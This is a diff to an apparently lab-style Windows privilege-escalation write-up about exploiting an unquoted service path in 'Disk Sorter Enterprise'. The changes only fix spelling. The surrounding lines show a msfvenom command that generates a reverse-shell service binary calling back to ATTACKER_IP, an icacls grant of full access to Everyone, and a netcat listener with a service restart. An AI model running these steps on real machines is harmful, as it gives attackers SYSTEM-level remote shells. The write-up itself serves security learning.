@@ -23,7 +23,7 @@ When the `SCM` **(Service Control Manager)** tries to Execute the Binary, a prob
 <br/>
 
 
-- <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enerprise</b> Service has <span style={{fontWeight: 'Bold'}}>Unquoted Service Paths.</span>
+- <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enterprise</b> Service has <span style={{fontWeight: 'Bold'}}>Unquoted Service Paths.</span>
 
 ```bash
 C:\> sc qc "Disk Sorter Enterprise"
@@ -57,7 +57,7 @@ C:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 
 <br/>
 
-- Generating and Transfering the **PAYLOAD**
+- Generating and Transferring the **PAYLOAD**
 
 ```js
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
@@ -76,7 +76,7 @@ C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 <br/>
 
 - Starting a `netcat` Listener.
-- Restarting the <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enerprise</b> Service. 
+- Restarting the <b style={{ color: 'MediumTurquoise' }}>Disk Sorter Enterprise</b> Service. 
 
 ```log
 C:\> sc stop  "Disk Sorter Enterprise"
